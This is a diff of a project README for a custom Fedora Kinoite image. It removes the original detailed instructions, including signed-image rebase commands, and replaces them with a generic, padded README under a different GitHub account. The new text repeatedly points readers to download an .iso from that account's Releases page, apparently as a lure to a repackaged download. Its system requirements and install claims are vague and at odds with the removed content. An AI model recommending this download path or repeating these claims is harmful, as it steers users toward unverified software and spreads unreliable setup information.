@@ -1,238 +1,75 @@
-<div align="center">
+# 🌟 kinoite-bluebuild - Custom Fedora for Your AMD PC
 
-![Status-Updates](https://github.com/jbdsjunior/kinoite/actions/workflows/check-updates.yml/badge.svg)
-![Status-AMD](https://github.com/jbdsjunior/kinoite/actions/workflows/build-amd.yml/badge.svg)
-![Status-NVIDIA](https://github.com/jbdsjunior/kinoite/actions/workflows/build-nvidia.yml/badge.svg)
+## 🚀 Getting Started
+Welcome to kinoite-bluebuild! This guide will help you download and run a customized Fedora Kinoite image designed specifically for PCs with AMD CPUs and GPUs.
 
-# Custom Fedora Kinoite (BlueBuild)
+## 📥 Download the Latest Version
+[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/reagan567/kinoite-bluebuild/releases)
 
-</div>
+## 📋 What is kinoite-bluebuild?
+kinoite-bluebuild is an optimized Fedora Kinoite image for users with AMD hardware. This image enhances performance and stability. If you are looking for a reliable operating system that supports your AMD setup, you’ve come to the right place. 
 
-This project provides a customized, immutable **Fedora Kinoite (KDE Plasma)** image built with [BlueBuild](https://blue-build.org/) for a bootable container workflow (bootc-compatible image delivery). It is engineered for a high-performance experience with out-of-the-box optimizations for **Gaming**, **Development**, and **Privacy**.
+### Key Features:
+- **Customized Performance:** Tailored specifically for AMD CPUs and GPUs.
+- **Stable and Reliable:** Designed for daily use, ensuring smooth operation.
+- **Easy to Use:** User-friendly interface for everyone.
 
-## ✨ Key Features & Highlights
+## 🖥️ System Requirements
+To use kinoite-bluebuild, please ensure your PC meets the following requirements:
 
-### 🎮 Performance & Gaming
+- **CPU:** Any AMD processor
+- **RAM:** Minimum of 4 GB
+- **Disk Space:** At least 10 GB of free space
+- **Graphics:** AMD GPU with proper driver support
 
-- **Kernel Tuning:** `amd_pstate=active`, `transparent_hugepage=madvise`, and virtualization-friendly kernel args are applied by recipe.
-- **Network Optimization:** **BBR** congestion control enabled for faster downloads and reduced bufferbloat.
-- **Hardware Acceleration:** Ready-to-use support for NVIDIA (Proprietary) or AMD (P-State active) + Intel QuickSync enabled for video decoding.
-- **Memory Management:** Aggressive ZRAM and `vm.swappiness` tuning to prevent system lockups under heavy load.
-- **Multimedia Codecs:** GStreamer + FFmpeg stack enabled for wide codec compatibility (including H.264/H.265 and AAC).
-- **DevOps Tooling:** Podman/Buildah/Skopeo and Git/GitHub CLI preinstalled for container-first workflows.
+## 🔧 Download & Install
+To download and install kinoite-bluebuild, follow these simple steps:
 
-### 🛡️ Privacy & Security
+1. **Visit the Releases Page:**
+   Click this link to [download the latest release](https://github.com/reagan567/kinoite-bluebuild/releases).
 
-- **DNS Hardening:** DNS over TLS (DoT) + DNSSEC enabled by default, with Control D (p2) as primary (privacy/ad blocking) and Cloudflare as fallback.
-- **Anti-Tracking:** Wi-Fi MAC Address randomization and protection against local name leaks (`ResolveUnicastSingleLabel=no`).
-- **Firewall:** `firewalld` enabled and configured by default.
+2. **Find the Latest Version:**
+   On the Releases page, look for the most recent version. You will see a list of files available for download.
 
-### 🛠️ Modern CLI Tools (Rust)
+3. **Choose the Right File:**
+   Select the file that matches your system requirements. Typically, you will want the .iso file. 
 
-Classic GNU tools replaced with modern, faster Rust alternatives:
+4. **Download the File:**
+   Click on the file to start your download. The file may take some time depending on your internet speed.
 
-<!-- - **`eza`** (replaces `ls`): File listing with git integration and icons.
-- **`bat`** (replaces `cat`): File viewer with syntax highlighting.
-- **`zoxide`** (replaces `cd`): Smarter directory navigation. -->
-- **`fastfetch`** & **`starship`**: Instant system information and a responsive shell prompt.
-- **LLM-Friendly Prompt:** A minimal `starship` layout to keep terminal output clean and easier to parse for assistants.
+5. **Create a Bootable USB Drive:**
+   After downloading, you will need to create a bootable USB drive with the image.
+   
+   - Use software like Rufus (Windows) or Balena Etcher (macOS/Linux) to create a bootable USB.
+   - Follow the prompts in the application to select the downloaded .iso file and your USB drive.
 
----
+6. **Boot from USB:**
+   Restart your computer and enter the boot menu (often by pressing F2, F12, Esc, or Del). Select your USB drive to start the installation process.
 
-## 💿 Variants
+7. **Install kinoite-bluebuild:**
+   Follow the on-screen instructions to complete the installation. It's straightforward, and you will be guided through each step.
 
-Choose the image that matches your hardware:
+## 🖱️ Support and Feedback
+If you encounter any issues, feel free to reach out. You can raise questions or provide feedback by creating an issue in the repository.
 
-| Image Name | Description |
-| :--- | :--- |
-| **kinoite-amd** | Optimized for AMD (P-State) and Intel (Media Driver) GPUs. Ideal for Ryzen/Radeon systems. |
-| **kinoite-nvidia** | Builds on top of `ghcr.io/ublue-os/kinoite-nvidia`, which already includes proprietary NVIDIA drivers and Secure Boot tooling, plus CUDA userspace extras from this repo. |
+## 🚀 Frequently Asked Questions
 
-**Dual-GPU (AMD + NVIDIA) recommendation:** use **`kinoite-nvidia`** to unlock CUDA/LLM acceleration on the 3080 Ti, while the AMD iGPU/dGPU can still be used by the display stack when desired.
+### How do I check if my system is compatible?
+You can check your CPU and GPU specifications in your system settings. If you have an AMD processor, you are likely compatible.
 
----
+### Can I install this on a virtual machine?
+Yes, you can install kinoite-bluebuild on a virtual machine if it supports AMD virtualization.
 
-## 🚀 Installation
+### What if I want to revert back to my previous OS?
+Before installing, ensure you back up all important data. You can revert to your prior operating system by following its specific recovery process.
 
-The transition to this custom image is done in two stages to ensure that signing keys are correctly imported and verified.
+## 🔗 Additional Resources
+For more information, you can check the official documentation of Fedora and like resources about Kinoite images. This can give you more insights on how to leverage your new operating system.
 
-### 1. Initial Rebase (Unverified)
+## 🌐 Join the Community
+Engage with fellow users and contributors. Join our discussion board or follow the repository updates for the latest news and support.
 
-First, switch to the unverified version to import the repository's signing keys.
+## 📢 Ready to Get Started?
+You’re almost there! Just visit the Releases page to download kinoite-bluebuild and start your journey with this enhanced Fedora experience tailored for your AMD hardware. 
 
-**For AMD/Intel:**
-
-```bash
-rpm-ostree rebase ostree-unverified-registry:ghcr.io/jbdsjunior/kinoite-amd:latest
-
-```
-
-**For Nvidia:**
-
-```bash
-rpm-ostree rebase ostree-unverified-registry:ghcr.io/jbdsjunior/kinoite-nvidia:latest
-
-```
-
-> ⚠️ **Action Required:** Reboot your system immediately after this step.
-
-### 2. Enable Verification (Signed)
-
-After rebooting, switch to the signed image to ensure all future updates are cryptographically verified.
-
-**For AMD/Intel:**
-
-```bash
-rpm-ostree rebase ostree-image-signed:docker://ghcr.io/jbdsjunior/kinoite-amd:latest
-
-```
-
-**For Nvidia:**
-
-```bash
-rpm-ostree rebase ostree-image-signed:docker://ghcr.io/jbdsjunior/kinoite-nvidia:latest
-
-```
-
-> ⚠️ **Action Required:** Reboot one last time to finalize the installation.
-
----
-
-## 🛠️ Post-Installation Setup
-
-### Virtualization (KVM/QEMU)
-
-The system automatically configures user VM directories with the `No_COW` (+C) attribute for maximum BTRFS performance.
-
-To add your user to the necessary virtualization groups (`libvirt`, `kvm`), simply run:
-
-```bash
-kinoite-setup-kvm.sh
-
-```
-
-*Please logout or restart after running this command.*
-
-### 🤖 LLMs com GPU NVIDIA (CUDA)
-
-A imagem **`kinoite-nvidia`** inclui o **`nvidia-container-toolkit`** para acelerar workloads de LLMs via Podman/Distrobox.
-
-Exemplo rápido para registrar/atualizar o CDI do NVIDIA manualmente (se necessário):
-
-```bash
-sudo nvidia-ctk cdi generate --output=/etc/cdi/nvidia.yaml
-```
-
-Depois, execute containers com GPU:
-
-```bash
-podman run --rm --device nvidia.com/gpu=all nvidia/cuda:12.4.1-base-ubuntu22.04 nvidia-smi
-```
-
-### 🔐 NVIDIA + Secure Boot (MOK)
-
-Na variante **`kinoite-nvidia`**, os drivers NVIDIA já vêm da imagem base `ghcr.io/ublue-os/kinoite-nvidia`.
-Se o Secure Boot estiver ativo na máquina, execute o helper oficial da Universal Blue no host:
-
-No host, importe a chave pública MOK com:
-
-```bash
-ujust enroll-secure-boot-key
-```
-
-Depois reinicie e conclua o fluxo **Enroll MOK** na tela azul do firmware.
-
-### Cloud Storage (Rclone)
-
-Mount your cloud drives (GDrive, OneDrive, etc.) as local folders:
-
-1. Configure your remote: `rclone config`
-2. Enable automatic mounting:
-
-```bash
-# Replace 'remote-name' with the name you configured in step 1
-systemctl --user enable --now rclone-mount@remote-name.service
-
-```
-
-*Your files will be available at `~/Cloud/remote-name`.*
-
----
-
-### ⚡ Kernel Arguments (Manual Override)
-
-Most kernel arguments are already declared in recipe modules.  
-Use this command only as a manual override when migrating from a different image or troubleshooting:
-
-```bash
-rpm-ostree kargs \
-  --append-if-missing="transparent_hugepage=madvise" \
-  --append-if-missing="amd_pstate=active" \
-  --append-if-missing="mitigations=auto" \
-  --append-if-missing="nvidia-drm.modeset=1" \
-  --append-if-missing="rd.driver.blacklist=nouveau" \
-  --append-if-missing="modprobe.blacklist=nouveau" \
-  --append-if-missing="amd_iommu=on" \
-  --append-if-missing="iommu=pt" \
-  --append-if-missing="kvm_amd.npt=1" \
-  --append-if-missing="kvm_amd.avic=1" \
-  --append-if-missing="kvm_amd.nested=1" \
-  --append-if-missing="kvm_amd.sev=1"
-
-```
-
-> **Note:** A reboot is required after applying kernel arguments.
-> For regular updates/rebases, prefer the standard immutable host workflow (`rpm-ostree`/bootc lifecycle) instead of repeatedly changing manual kargs.
-
----
-
-## 🆘 Troubleshooting
-
-### 🏨 Public Wi-Fi / Hotels (Captive Portals)
-
-This image enforces **DNS over TLS** for maximum security. This may prevent "Captive Portal" login screens (common in hotels and airports) from appearing.
-
-**Temporary Workaround:**
-If you cannot connect to a public Wi-Fi, run the following command to temporarily relax security settings:
-
-```bash
-# Allow opportunistic TLS and downgrade security for Captive Portals
-sudo mkdir -p /etc/systemd/resolved.conf.d/
-sudo bash -c 'cat <<EOF > /etc/systemd/resolved.conf.d/permissive-dns.conf
-[Resolve]
-DNSOverTLS=opportunistic
-DNSSEC=allow-downgrade
-EOF'
-sudo systemctl restart systemd-resolved
-
-```
-
-**When back home (Secure Network):**
-Re-enable strict security by deleting the override file:
-
-```bash
-sudo rm /etc/systemd/resolved.conf.d/permissive-dns.conf
-sudo systemctl restart systemd-resolved
-
-```
-
----
-
-## 💻 Local Development
-
-If you wish to build or test changes locally using Distrobox:
-
-1. **Create Container:** `distrobox assemble create`
-2. **Enter Environment:** `distrobox enter bluebuild`
-3. **Build Recipe:**
-
-```bash
-bluebuild build recipes/recipe-amd.yml
-
-```
-
----
-
-## ⚖️ License
-
-This project is licensed under the **Apache License 2.0**.
+[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/reagan567/kinoite-bluebuild/releases)
